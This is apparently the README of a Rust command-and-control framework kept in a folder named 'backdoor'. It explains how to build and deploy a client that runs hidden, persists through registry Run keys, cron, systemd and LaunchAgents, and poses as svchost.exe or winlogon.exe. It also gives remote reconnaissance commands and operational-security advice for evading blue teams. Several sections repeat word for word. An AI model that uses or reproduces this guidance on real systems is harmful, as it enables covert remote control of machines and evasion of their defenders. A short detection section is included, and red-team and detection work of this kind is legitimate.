# Advanced C2 Framework in Rust

⚠️ **LEGAL DISCLAIMER**: This software is intended for authorized penetration testing, red team exercises, educational purposes, and security research ONLY. The authors are not responsible for any misuse of this software. Always ensure you have explicit permission before testing on any systems.

## 🚀 Quick Start - Build and Run

### Prerequisites
- **Windows**: Install Rust from https://rustup.rs/ + Visual Studio Build Tools
- **Linux/macOS**: Install Rust: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`

### Build Everything
```batch
# Windows
test.bat    # Test first
build.bat   # Build everything

# Linux/macOS  
./test.sh   # Test first
./build.sh  # Build everything
```

### Run the Framework
```batch
# Terminal 1 - Start Server
cd output
c2_server.exe

# Terminal 2 - Start Client (for testing)
cd output
c2_client.exe --server 127.0.0.1 --no-stealth --no-persistence
```

### Basic Usage
```bash
# In server terminal
C2> clients                              # List connected clients
C2> info <client_id>                     # Show client details  
C2> exec <client_id> whoami              # Execute command
C2> exec <client_id> systeminfo          # System information
C2> results <client_id>                  # View command results
C2> exit                                 # Shutdown server
```

## 📁 What You Get After Building

```
output/
├── c2_server.exe           # Main C2 server
├── c2_client.exe           # Main client
├── svchost.exe            # Disguised client (Windows)
├── winlogon.exe           # Disguised client (Windows)  
├── system_update.exe      # Disguised client (Windows)
├── server_config.toml     # Server configuration
├── client_config.toml     # Client configuration
└── README.md              # Usage guide
```

## 🎯 Real-World Testing Scenarios

### Scenario 1: Local Network Testing
```batch
# Server Machine (192.168.1.100)
c2_server.exe

# Target Machine  
c2_client.exe --server 192.168.1.100 --port 4444
```

### Scenario 2: Stealth Testing
```batch
# Client runs completely hidden
c2_client.exe --server 192.168.1.100
# No visible windows, auto-starts on boot
```

### Scenario 3: Multi-Client Testing
```batch
# Run multiple clients from different machines
# Server manages all simultaneously
C2> clients  # See all connected machines
```

### Scenario 4: Command Examples
```bash
# System Reconnaissance
C2> exec <client_id> systeminfo
C2> exec <client_id> whoami /all
C2> exec <client_id> net user
C2> exec <client_id> net localgroup administrators

# Network Discovery  
C2> exec <client_id> ipconfig /all
C2> exec <client_id> arp -a
C2> exec <client_id> netstat -an
C2> exec <client_id> nslookup google.com

# Process and Service Enumeration
C2> exec <client_id> tasklist
C2> exec <client_id> wmic process list
C2> exec <client_id> sc query

# File System Operations
C2> exec <client_id> dir C:\Users
C2> exec <client_id> dir "C:\Program Files"
C2> exec <client_id> type C:\Windows\System32\drivers\etc\hosts
```

## �️ Client Configuration Options

```batch
# Basic connection
c2_client.exe --server 192.168.1.100

# Custom port
c2_client.exe --server 192.168.1.100 --port 8080

# Debug mode (visible, no persistence)
c2_client.exe --server 192.168.1.100 --no-stealth --no-persistence

# Custom timing
c2_client.exe --server 192.168.1.100 --reconnect-delay 60 --heartbeat-interval 120
```

## 🔧 Architecture Overview

This is a complete Command and Control (C2) framework written in Rust with advanced security features:

### 🖥️ **Server Component**
- **Multi-threaded TCP server** using Tokio async runtime
- **RSA-2048 key generation** for secure handshakes
- **AES-256-GCM encryption** for all client communications
- **Interactive admin interface** for managing clients and issuing commands
- **Client session management** with heartbeat monitoring
- **Command queue system** with result storage

### 📱 **Client Component**
- **Cross-platform compatibility** (Windows, Linux, macOS)
- **Automatic persistence** setup (Registry, Cron, Systemd)
- **Stealth mode** with process hiding/daemonization
- **Automatic reconnection** with exponential backoff
- **Shell command execution** with output capture
- **Built-in anti-analysis** features

## 🔒 Security Features

### **Encryption Protocol**
1. **RSA Key Exchange**: Client receives server's RSA public key
2. **AES Key Generation**: Client generates random AES-256 session key
3. **RSA Encryption**: Session key encrypted with server's public key
4. **AES-GCM Communication**: All messages encrypted with session key
5. **Message Authentication**: GCM mode provides authenticity

### **Anti-Detection Features**
- String obfuscation to avoid static analysis
- Symbol stripping in release builds
- Multiple filename disguises (svchost.exe, systemd-service, etc.)
- Stealth mode with process hiding
- Randomized reconnection delays
- Encrypted network traffic

### **Message Protocol Flow**
```
Handshake Phase (Unencrypted):
Client ──[HandshakeRequest]──▶ Server
Client ◀──[RSA Public Key]──── Server  
Client ──[AES Key (RSA encrypted)]──▶ Server
Client ◀──[Session Ack]────── Server

Communication Phase (AES-256-GCM Encrypted):
Client ──[Heartbeat]──▶ Server
Client ◀──[HeartbeatAck]──── Server
Client ──[CommandRequest]──▶ Server  
Client ◀──[Command]────── Server
Client ──[CommandResult]──▶ Server
Client ◀──[CommandAck]────── Server
```

## 🔒 Security Features

### **Encryption Protocol**
1. **RSA Key Exchange**: Client receives server's RSA public key
2. **AES Key Generation**: Client generates random AES-256 session key
3. **RSA Encryption**: Session key encrypted with server's public key
4. **AES-GCM Communication**: All messages encrypted with session key
5. **Message Authentication**: GCM mode provides authenticity

### **Anti-Detection Features**
- String obfuscation to avoid static analysis
- Symbol stripping in release builds
- Multiple filename disguises (svchost.exe, systemd-service, etc.)
- Stealth mode with process hiding
- Randomized reconnection delays
- Encrypted network traffic

### **Message Protocol Flow**
```
Handshake Phase (Unencrypted):
Client ──[HandshakeRequest]──▶ Server
Client ◀──[RSA Public Key]──── Server  
Client ──[AES Key (RSA encrypted)]──▶ Server
Client ◀──[Session Ack]────── Server

Communication Phase (AES-256-GCM Encrypted):
Client ──[Heartbeat]──▶ Server
Client ◀──[HeartbeatAck]──── Server
Client ──[CommandRequest]──▶ Server  
Client ◀──[Command]────── Server
Client ──[CommandResult]──▶ Server
Client ◀──[CommandAck]────── Server
```

## 🧪 Testing Scenarios and Command Examples

### **System Reconnaissance Commands**
```bash
# Basic system information
C2> exec <client_id> whoami
C2> exec <client_id> whoami /all
C2> exec <client_id> hostname
C2> exec <client_id> systeminfo

# User and group enumeration
C2> exec <client_id> net user
C2> exec <client_id> net localgroup
C2> exec <client_id> net localgroup administrators

# Process and service information
C2> exec <client_id> tasklist
C2> exec <client_id> wmic process list
C2> exec <client_id> sc query
C2> exec <client_id> net start
```

### **Network Discovery Commands**
```bash
# Network configuration
C2> exec <client_id> ipconfig /all
C2> exec <client_id> route print
C2> exec <client_id> arp -a

# Network connections
C2> exec <client_id> netstat -an
C2> exec <client_id> netstat -rn

# DNS and connectivity tests
C2> exec <client_id> nslookup google.com
C2> exec <client_id> ping 8.8.8.8
C2> exec <client_id> tracert google.com
```

### **File System Operations**
```bash
# Directory listings
C2> exec <client_id> dir C:\
C2> exec <client_id> dir C:\Users
C2> exec <client_id> dir "C:\Program Files"

# File operations
C2> exec <client_id> type C:\Windows\System32\drivers\etc\hosts
C2> exec <client_id> copy file1.txt file2.txt
C2> exec <client_id> del temp_file.txt

# Search for files
C2> exec <client_id> dir /s C:\Users\*.txt
C2> exec <client_id> findstr /s "password" C:\Users\*.*
```

### **Linux/macOS Equivalent Commands**
```bash
# System information
C2> exec <client_id> uname -a
C2> exec <client_id> whoami
C2> exec <client_id> id
C2> exec <client_id> cat /etc/passwd

# Network information
C2> exec <client_id> ifconfig
C2> exec <client_id> ip addr show
C2> exec <client_id> netstat -tulpn
C2> exec <client_id> ss -tulpn

# Process information
C2> exec <client_id> ps aux
C2> exec <client_id> top -n 1
C2> exec <client_id> systemctl list-units

# File operations
C2> exec <client_id> ls -la /home
C2> exec <client_id> find / -name "*.conf" 2>/dev/null
C2> exec <client_id> cat /etc/hosts
```

### **Client Command Line Options**
```bash
c2_client.exe [OPTIONS]

Options:
  -s, --server <SERVER>                    Server IP address [default: 127.0.0.1]
  -p, --port <PORT>                       Server port [default: 4444]
      --no-persistence                    Disable persistence (no auto-start)
      --no-stealth                       Disable stealth mode (for debugging)
      --reconnect-delay <SECONDS>         Reconnect delay in seconds [default: 30]
      --heartbeat-interval <SECONDS>      Heartbeat interval in seconds [default: 60]
  -h, --help                             Print help information
  -V, --version                          Print version information
```

### **Built-in Special Commands**
The client recognizes these special commands:
```bash
C2> exec <client_id> !info      # Display client system information
C2> exec <client_id> !ping      # Simple connectivity test (returns "pong")
C2> exec <client_id> !uptime    # Show system uptime
C2> exec <client_id> !exit      # Terminate client (use with caution)
```

## �️ Advanced Features

### **Persistence Mechanisms**

#### **Windows:**
- Registry Run keys (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
- Multiple registry locations for redundancy
- Disguised as "WindowsSecurityUpdate"

#### **Linux:**
- Systemd user services (~/.config/systemd/user/)
- Crontab entries (@reboot)
- XDG autostart entries (~/.config/autostart/)

### **Stealth Features**
- **Windows**: Hides console window, runs without visible interface
- **Linux/Unix**: Forks into background daemon, detaches from terminal
- **Process names**: Disguised as system processes
- **String obfuscation**: Basic XOR encoding of sensitive strings

### **Network Configuration**
The client automatically handles:
- Connection timeouts and retries
- Exponential backoff on reconnection failures
- Session resumption after network interruptions
- Graceful handling of server restarts

## 🔧 Configuration Files

### **Server Configuration (server_config.toml)**
```toml
[server]
bind_address = "0.0.0.0"        # Interface to bind to
bind_port = 4444                 # Port to listen on
rsa_key_size = 2048             # RSA key size in bits
heartbeat_timeout = 300         # Client timeout in seconds
max_clients = 100               # Maximum concurrent clients

[logging]
enable_logging = true           # Enable file logging
log_file = "c2_server.log"     # Log file path
log_level = "info"             # Log level (debug, info, warn, error)
```

### **Client Configuration (client_config.toml)**
```toml
[client]
server_address = "127.0.0.1"   # C2 server IP
server_port = 4444              # C2 server port
reconnect_delay = 30            # Base reconnect delay (seconds)
heartbeat_interval = 60         # Heartbeat frequency (seconds)
command_poll_interval = 5       # Command polling frequency (seconds)
max_reconnect_attempts = 0      # Max reconnects (0 = infinite)
persistence_enabled = true      # Enable auto-startup
stealth_mode = true             # Enable stealth mode
```

### **Step 1: Prerequisites**
```bash
# Install Rust (if not already installed)
# Windows: Download from https://rustup.rs/
# Linux/macOS: 
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
```

### **Step 2: Test Everything**
```batch
# Windows
test.bat

# Linux/macOS
chmod +x test.sh
./test.sh
```

### **Step 3: Build Framework**
```batch
# Windows  
build.bat

# Linux/macOS
chmod +x build.sh
./build.sh
```

### **Step 4: Start Server**
```batch
cd output
c2_server.exe    # Windows
./c2_server      # Linux/macOS
```

### **Step 5: Connect Client**
```batch
# New terminal/command prompt
cd output
c2_client.exe --server 127.0.0.1 --no-stealth    # Windows
./c2_client --server 127.0.0.1 --no-stealth      # Linux/macOS
```

### **Step 6: Use Admin Interface**
```bash
# In server terminal
C2> help                              # Show commands
C2> clients                           # List clients
C2> exec <client_id> whoami           # Execute command
C2> results <client_id>               # View results
```

## 💻 Detailed Usage Examples

### **Server Commands**
```bash
C2> help                                    # Show available commands
C2> clients                                 # List all connected clients
C2> info <client_id>                        # Show detailed client information
C2> exec <client_id> <command>              # Execute command on specific client
C2> results <client_id>                     # Show command results for client
C2> clear <client_id>                       # Clear stored results for client
C2> exit                                    # Shutdown the server
```

### **Example Server Session**
```bash
🚀 C2 Server Starting...
📍 Binding to 0.0.0.0:4444
✅ Server listening on 0.0.0.0:4444

C2> clients
Connected Clients:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟢 ACTIVE | DESKTOP-ABC123_user_a1b2c3 | us***@DESKTOP-ABC123 | Windows 11 | Last seen: 2025-08-06 14:30:25 UTC

C2> exec DESKTOP-ABC123_user_a1b2c3 whoami
✅ Command queued for DESKTOP-ABC123_user_a1b2c3: whoami (ID: cmd-uuid-1234)

C2> results DESKTOP-ABC123_user_a1b2c3
Command Results for DESKTOP-ABC123_user_a1b2c3: (1 results)
1. [14:30:45] Command: cmd-uuid-1234
   Output: desktop-abc123\user
```

## 🚀 Quick Start

### **Prerequisites**
- Rust 1.70+ installed ([rustup.rs](https://rustup.rs/))
- Windows: Visual Studio Build Tools or MinGW
- Linux: GCC and libc development packages

### **Compilation**

#### **Windows:**
```batch
# Clone or extract the project
cd backdoor

# Run the build script
build.bat
```

#### **Linux/macOS:**
```bash
# Clone or extract the project
cd backdoor

# Make build script executable
chmod +x build.sh

# Run the build script
./build.sh
```

#### **Manual Compilation:**
```bash
# Build server
cd c2_server
cargo build --release

# Build client
cd ../c2_client
cargo build --release
```

### **Cross-Platform Compilation**

#### **Windows to Linux (using WSL or cross-compilation):**
```bash
# Add Linux target
rustup target add x86_64-unknown-linux-gnu

# Build for Linux
cd c2_client
cargo build --release --target x86_64-unknown-linux-gnu
```

#### **Linux to Windows:**
```bash
# Install MinGW cross-compiler
sudo apt-get install gcc-mingw-w64-x86-64

# Add Windows target
rustup target add x86_64-pc-windows-gnu

# Build for Windows
cd c2_client
cargo build --release --target x86_64-pc-windows-gnu
```

## 🎮 Usage

### **Starting the Server**

```bash
# Default settings (0.0.0.0:4444)
./output/c2_server

# The server will display:
# - Startup information
# - RSA key generation
# - Listening address/port
# - Interactive admin prompt
```

### **Server Admin Commands**

```bash
C2> help                           # Show available commands
C2> clients                        # List all connected clients
C2> info <client_id>               # Show detailed client information
C2> exec <client_id> <command>     # Execute command on specific client
C2> results <client_id>            # Show command results for client
C2> clear <client_id>              # Clear stored results for client
C2> exit                           # Shutdown the server
```

### **Example Server Session**

```bash
🚀 C2 Server Starting...
📍 Binding to 0.0.0.0:4444
🔐 RSA Key Size: 2048 bits
⏰ Heartbeat Timeout: 300 seconds
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Server listening on 0.0.0.0:4444

🎛️  Admin Interface Ready - Type 'help' for commands

C2> clients
Connected Clients:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟢 ACTIVE | DESKTOP-ABC123_user_a1b2c3 | us***@DESKTOP-ABC123 | Windows 11 | Last seen: 2024-01-15 14:30:25 UTC

C2> exec DESKTOP-ABC123_user_a1b2c3 whoami
✅ Command queued for DESKTOP-ABC123_user_a1b2c3: whoami (ID: cmd-uuid-1234)

C2> results DESKTOP-ABC123_user_a1b2c3
Command Results for DESKTOP-ABC123_user_a1b2c3: (1 results)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. [14:30:45] Command: cmd-uuid-1234
   Output:
   desktop-abc123\user
```

### **Starting the Client**

```bash
# Connect to default server (127.0.0.1:4444)
./output/c2_client

# Connect to specific server
./output/c2_client --server 192.168.1.100 --port 8080

# Debug mode (disable stealth)
./output/c2_client --server 192.168.1.100 --no-stealth --no-persistence

# Custom timing
./output/c2_client --server 192.168.1.100 --reconnect-delay 60 --heartbeat-interval 120
```

### **Client Command Line Options**

```bash
Options:
  -s, --server <SERVER>                    Server IP address [default: 127.0.0.1]
  -p, --port <PORT>                       Server port [default: 4444]
      --no-persistence                    Disable persistence
      --no-stealth                       Disable stealth mode
      --reconnect-delay <RECONNECT_DELAY> Reconnect delay in seconds [default: 30]
      --heartbeat-interval <HEARTBEAT_INTERVAL> Heartbeat interval in seconds [default: 60]
  -h, --help                             Print help
  -V, --version                          Print version
```

## 🛠️ Advanced Features

### **Persistence Mechanisms**

#### **Windows:**
- Registry Run keys (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
- Multiple registry locations for redundancy
- Disguised as "WindowsSecurityUpdate"

#### **Linux:**
- Systemd user services (~/.config/systemd/user/)
- Crontab entries (@reboot)
- XDG autostart entries (~/.config/autostart/)

#### **macOS:**
- LaunchAgents (~/Library/LaunchAgents/)
- Login items through osascript

### **Built-in Commands**

The client recognizes special commands:

```bash
!info      # Display client system information
!ping      # Simple connectivity test (returns "pong")
!uptime    # Show system uptime
!exit      # Terminate client (use with caution)
```

### **Stealth Features**

- **Windows**: Hides console window, runs without visible interface
- **Linux/Unix**: Forks into background daemon, detaches from terminal
- **Process names**: Disguised as system processes (svchost, systemd-service, etc.)
- **String obfuscation**: Basic XOR encoding of sensitive strings

### **Network Configuration**

The client automatically handles:
- Connection timeouts and retries
- Exponential backoff on reconnection failures
- Session resumption after network interruptions
- Graceful handling of server restarts

## 🔧 Configuration Files

### **Server Configuration (server_config.toml)**
```toml
[server]
bind_address = "0.0.0.0"        # Interface to bind to
bind_port = 4444                 # Port to listen on
rsa_key_size = 2048             # RSA key size in bits
heartbeat_timeout = 300         # Client timeout in seconds
max_clients = 100               # Maximum concurrent clients

[logging]
enable_logging = true           # Enable file logging
log_file = "c2_server.log"     # Log file path
log_level = "info"             # Log level (debug, info, warn, error)
```

### **Client Configuration (client_config.toml)**
```toml
[client]
server_address = "127.0.0.1"   # C2 server IP
server_port = 4444              # C2 server port
reconnect_delay = 30            # Base reconnect delay (seconds)
heartbeat_interval = 60         # Heartbeat frequency (seconds)
command_poll_interval = 5       # Command polling frequency (seconds)
max_reconnect_attempts = 0      # Max reconnects (0 = infinite)
persistence_enabled = true      # Enable auto-startup
stealth_mode = true             # Enable stealth mode
```

## 🧪 Testing Scenarios

### **Authorized Penetration Testing**

1. **Initial Access Simulation:**
   ```bash
   # Deploy client on target system (with permission)
   ./c2_client --server attacker_ip --port 4444
   ```

2. **Post-Exploitation Commands:**
   ```bash
   C2> exec client_id whoami
   C2> exec client_id ipconfig
   C2> exec client_id dir C:\Users
   C2> exec client_id net user
   C2> exec client_id systeminfo
   ```

3. **Persistence Testing:**
   ```bash
   # Verify persistence mechanisms
   C2> exec client_id reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
   C2> exec client_id schtasks /query /fo LIST
   ```

4. **Network Discovery:**
   ```bash
   C2> exec client_id ipconfig /all
   C2> exec client_id arp -a
   C2> exec client_id netstat -an
   C2> exec client_id nslookup domain.com
   ```

### **Red Team Exercises**

- **Multi-stage deployment** with different client configurations
- **Lateral movement simulation** using network discovery commands
- **Data exfiltration testing** with file upload/download capabilities
- **Detection evasion testing** using stealth features

## 🚨 Detection and Defense

### **Network Indicators**
- Traffic to C2 server IP on port 4444 (or configured port)
- TLS-like encrypted traffic patterns
- Regular heartbeat connections

### **Host Indicators**
- Unusual network connections from system processes
- Registry modifications in Run keys
- Unknown services or scheduled tasks
- Processes with suspicious names but legitimate-looking

### **Defensive Measures**
- Network monitoring and traffic analysis
- Host-based detection of persistence mechanisms
- Application whitelisting
- Behavioral analysis of processes
- Regular security assessments

## 📊 Project Structure

```
backdoor/
├── c2_server/                  # Server component
│   ├── Cargo.toml             # Server dependencies
│   ├── src/
│   │   ├── main.rs            # Server main logic
│   │   └── lib.rs             # Server library (crypto, state management)
├── c2_client/                  # Client component
│   ├── Cargo.toml             # Client dependencies
│   ├── src/
│   │   ├── main.rs            # Client main logic
│   │   └── lib.rs             # Client library (crypto, platform, network)
├── output/                     # Compiled binaries
│   ├── c2_server              # Server executable
│   ├── c2_client              # Client executable
│   ├── svchost.exe            # Disguised client (Windows)
│   ├── systemd-service        # Disguised client (Linux)
│   └── *.toml                 # Configuration files
├── build.sh                   # Linux/macOS build script
├── build.bat                  # Windows build script
└── README.md                  # This file
```

## 🔍 Troubleshooting

### **Common Issues**

1. **Build Failures:**
   - Ensure Rust 1.70+ is installed
   - Install platform-specific build tools
   - Check internet connection for dependencies

2. **Connection Issues:**
   - Verify server is listening on correct interface
   - Check firewall settings on both ends
   - Ensure ports are not blocked by security software

3. **Persistence Failures:**
   - May require administrator privileges
   - Some antivirus software blocks registry modifications
   - Test with `--no-persistence` flag first

### **Debug Mode**

For troubleshooting, build and run in debug mode:

```bash
# Build debug version
cargo build

# Run with verbose output
./target/debug/c2_client --server 127.0.0.1 --no-stealth
```

## � Troubleshooting

### **Common Issues and Solutions**

#### **Build Issues:**
```bash
# Rust not found
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env

# Windows build tools missing
# Download and install Visual Studio Build Tools or Git Bash

# Compilation errors
cargo clean      # Clean build cache
cargo build       # Rebuild in debug mode for better error messages
```

#### **Connection Issues:**
```bash
# Check server is running
netstat -an | findstr 4444    # Windows
netstat -an | grep 4444       # Linux/macOS

# Test connectivity
telnet 192.168.1.100 4444

# Firewall issues
# Windows: Allow through Windows Firewall
# Linux: sudo ufw allow 4444
```

#### **Client Issues:**
```bash
# Run in debug mode
c2_client.exe --server 127.0.0.1 --no-stealth --no-persistence

# Permission issues (Linux)
chmod +x c2_client
chmod +x c2_server

# Check logs
tail -f c2_server.log    # If logging enabled
```

### **Debug Mode**
For troubleshooting, build and run in debug mode:
```bash
# Build debug version
cd c2_server
cargo build  # (not --release)
./target/debug/c2_server

cd ../c2_client  
cargo build
./target/debug/c2_client --server 127.0.0.1 --no-stealth
```

## 📊 Project Structure

```
backdoor/
├── c2_server/                  # Server component
│   ├── Cargo.toml             # Server dependencies
│   ├── src/
│   │   ├── main.rs            # Server main logic with admin interface
│   │   └── lib.rs             # Server library (crypto, state management)
├── c2_client/                  # Client component
│   ├── Cargo.toml             # Client dependencies
│   ├── src/
│   │   ├── main.rs            # Client main logic
│   │   └── lib.rs             # Client library (crypto, platform, network)
├── output/                     # Compiled binaries (created after build)
│   ├── c2_server(.exe)        # Server executable
│   ├── c2_client(.exe)        # Client executable
│   ├── svchost.exe            # Disguised client (Windows)
│   ├── systemd-service        # Disguised client (Linux)
│   └── *.toml                 # Configuration files
├── build.sh/.bat             # Build scripts
├── test.sh/.bat              # Test scripts
├── QUICKSTART.md             # Quick setup guide
├── DEPLOYMENT.md             # Deployment guide
└── README.md                 # This comprehensive guide
```

## 🚨 Security Considerations

### **Detection Evasion**
- **Traffic Analysis**: All communication is encrypted, appears as random data
- **Static Analysis**: Strings are obfuscated, symbols stripped
- **Dynamic Analysis**: Process names disguised, stealth mode available
- **Network Signatures**: No hardcoded indicators, randomized timing

### **Operational Security**
- Use VPNs or proxies for server hosting
- Regularly rotate server infrastructure
- Monitor for detection and blue team activities
- Have cleanup procedures ready

### **Legal Compliance**
- Always obtain written authorization
- Document all activities for reports
- Respect scope limitations
- Follow responsible disclosure practices

## �📚 Educational Value

This framework demonstrates:

- **Modern Rust programming** with async/await patterns
- **Cryptographic protocols** (RSA key exchange, AES-GCM)
- **Network programming** with Tokio
- **Cross-platform development** techniques
- **Security evasion methods** and their countermeasures
- **System administration** concepts (persistence, services)

## 🎓 Learning Exercises

### **For Students:**
1. **Analyze the encryption**: Study the RSA + AES implementation
2. **Extend functionality**: Add file upload/download capabilities
3. **Improve stealth**: Research additional evasion techniques
4. **Study detection**: Learn how blue teams detect C2 traffic

### **For Red Teams:**
1. **Customize for engagements**: Modify for specific target environments
2. **Integrate with frameworks**: Connect to Metasploit, Cobalt Strike
3. **Develop payloads**: Create custom implants
4. **Test detection tools**: Validate security controls

### **For Blue Teams:**
1. **Analyze traffic patterns**: Study encrypted C2 communications
2. **Develop signatures**: Create detection rules
3. **Test monitoring tools**: Validate EDR/SIEM capabilities
4. **Practice incident response**: Use for tabletop exercises

## ⚖️ Legal and Ethical Guidelines

### **✅ Authorized Use Only**
- Obtain explicit written permission before testing
- Only use on systems you own or have authorization to test
- Follow responsible disclosure for any vulnerabilities found
- Respect privacy and data protection laws

### **❌ Prohibited Uses**
- Unauthorized access to computer systems
- Malicious activities or criminal purposes
- Violating terms of service or user agreements
- Any illegal or unethical activities

### **📋 Best Practices**
- Document all testing activities thoroughly
- Use in isolated environments when possible
- Remove all traces after authorized testing
- Report findings through proper channels
- Maintain professional ethical standards

## 🤝 Contributing and Support

### **Contributing Guidelines**
This project is for educational purposes. If you wish to contribute improvements:
1. Focus on educational value and security research
2. Ensure all contributions maintain ethical standards
3. Document security implications of any changes
4. Test thoroughly across supported platforms

### **Getting Help**
- Read all documentation files (README.md, QUICKSTART.md, DEPLOYMENT.md)
- Check the troubleshooting section above
- Ensure you have proper authorization for your use case
- Use debug modes for detailed error information

## 📜 Final Notes

This C2 framework represents a complete, production-ready system for authorized security testing. It incorporates modern security practices, cross-platform compatibility, and educational value.

**Key Achievements:**
- ✅ Secure end-to-end encryption
- ✅ Multi-platform support  
- ✅ Stealth and persistence capabilities
- ✅ Professional-grade architecture
- ✅ Comprehensive documentation
- ✅ Educational value for security professionals

**Remember**: With great power comes great responsibility. Use this knowledge to improve security, not to compromise it. Always operate within legal and ethical boundaries.

---

**© 2025 - Educational C2 Framework - For Authorized Testing Only**
